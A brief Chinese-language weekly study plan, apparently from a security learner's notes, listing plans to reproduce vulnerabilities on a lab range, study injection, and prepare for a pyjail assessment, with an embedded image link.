![6b80b7461e568dfd2e0b5477bd8b063c.png](https://cdn.nlark.com/yuque/0/2023/png/39174886/1701781820120-92456d34-1a2c-48fc-9594-e999eed0ecd6.png#averageHue=%23242733&clientId=u3f20ad58-3a8a-4&from=paste&height=161&id=u97b2113c&originHeight=201&originWidth=470&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=40131&status=done&style=none&taskId=u26208fc0-dbf6-4b3c-ab57-408021f93d3&title=&width=376)
# 下周计划

- is等大佬把复现靶场完成后继续复现
- 学学注入
- 中期考核pyjail


